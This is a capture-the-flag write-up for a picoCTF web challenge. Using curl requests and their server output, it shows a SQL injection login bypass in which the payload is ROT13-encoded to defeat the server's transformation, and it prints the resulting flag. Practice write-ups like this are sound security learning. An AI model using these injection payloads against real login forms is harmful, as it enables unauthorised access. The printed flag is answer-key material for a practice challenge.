# picoGym Level 8: Irish-Name-Repo 3 🧠🧠🧠
Source: https://play.picoctf.org/practice/challenge/8

## Goal
There is a secure website running at https://jupiter.challenges.picoctf.org/problem/40742/ or<br>
http://jupiter.challenges.picoctf.org:40742<br>
Try to see if you can login as admin!

## What I learned
```
SQL Injection

ChatGPT SQL Injection Code: ' OR '1'='1 (Not work this time)
Cipher Encoding: https://www.dcode.fr/cipher-identifier ⭐⭐⭐⭐⭐
```             

## Solution
```
https://webshell.picoctf.org/

# View Page Source

<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
                <div class="panel-heading">
                    <h3 class="panel-title">Admin Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php" method="POST">
                        <fieldset>
                            <div class="form-group">
                                
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>
                            <input type="hidden" name="debug" value="0">👀

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>

# Method 1: curl
AsianHacker-picoctf@webshell:~$ curl -v http://jupiter.challenges.picoctf.org:40742/login.php --data "password='admin'&debug=1" ⌨️
*   Trying 3.131.60.8:40742...
* Connected to jupiter.challenges.picoctf.org (3.131.60.8) port 40742 (#0)
> POST /login.php HTTP/1.1
> Host: jupiter.challenges.picoctf.org:40742
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Length: 24
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 Internal Server Error
< Content-type: text/html; charset=UTF-8
* no chunk, no close, no size. Assume close to signal end
< 
<pre>password: 'admin'
SQL query: SELECT * FROM admin where password = ''nqzva'' 👀 encrypted but what?
* Closing connection 0
</pre>

# Try SQL Injection
AsianHacker-picoctf@webshell:~$ curl -v http://jupiter.challenges.picoctf.org:40742/login.php --data "password=' OR 1=1 --&debug=1" ⌨️
*   Trying 3.131.60.8:40742...
* Connected to jupiter.challenges.picoctf.org (3.131.60.8) port 40742 (#0)
> POST /login.php HTTP/1.1
> Host: jupiter.challenges.picoctf.org:40742
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Length: 28
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 Internal Server Error
< Content-type: text/html; charset=UTF-8
* no chunk, no close, no size. Assume close to signal end
< 
<pre>password: ' OR 1=1 --
SQL query: SELECT * FROM admin where password = '' BE 1=1 --' 👀 encrypted but what?
* Closing connection 0

# Used BE 1=1 -- on Cipher Identifier: https://www.dcode.fr/cipher-identifier ⭐⭐⭐⭐⭐
Warning The text has a short length ⚠️, this can affect the quantity and reliability of the results (see FAQ)
Warning Few or no significative results (see FAQ)

# Made password longer and not one word
AsianHacker-picoctf@webshell:~$ curl -v http://jupiter.challenges.picoctf.org:40742/login.php --data "password='hacker du is the best ever'&debug=1" ⌨️
*   Trying 3.131.60.8:40742...
* Connected to jupiter.challenges.picoctf.org (3.131.60.8) port 40742 (#0)
> POST /login.php HTTP/1.1
> Host: jupiter.challenges.picoctf.org:40742
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Length: 45
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 Internal Server Error
< Content-type: text/html; charset=UTF-8
* no chunk, no close, no size. Assume close to signal end
< 
<pre>password: 'hacker du is the best ever'
SQL query: SELECT * FROM admin where password = ''unpxre qh vf gur orfg rire'' 👀 encrpyted but what?
* Closing connection 0

# Used unpxre qh vf gur orfg rire on Cipher Identifier: https://www.dcode.fr/cipher-identifier
Results:
    ROT-13 Cipher 👀 has high change to be encrypted w/ this

# Double check w/ CyberChef: 
https://cyberchef.io/#recipe=ROT13(true,true,false,13)&input=dW5weHJlIHFoIHZmIGd1ciBvcmZnIHJpcmU

# Need encode payload: ' OR 1=1 -- using ROT-13 then use it
https://cyberchef.io/#recipe=ROT13(true,true,false,13)&input=JyBPUiAxPTEgLS0
Output: ' BE 1=1 --

# Final
AsianHacker-picoctf@webshell:~$ curl -v http://jupiter.challenges.picoctf.org:40742/login.php --data "password=' BE 1=1 --&debug=1" ⌨️
*   Trying 3.131.60.8:40742...
* Connected to jupiter.challenges.picoctf.org (3.131.60.8) port 40742 (#0)
> POST /login.php HTTP/1.1
> Host: jupiter.challenges.picoctf.org:40742
> User-Agent: curl/7.81.0
> Accept: */*
> Content-Length: 28
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-type: text/html; charset=UTF-8
* no chunk, no close, no size. Assume close to signal end
< 
<pre>password: ' BE 1=1 --
SQL query: SELECT * FROM admin where password = '' OR 1=1 --' 👀 nice the BE got encrypted into OR
* Closing connection 0
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}</p> 🔐

# Method 2: Burp Suite
```

## Flag
picoCTF{3v3n_m0r3_SQL_4424e7af}

## Continue
[Continue](./picoGym0088.md)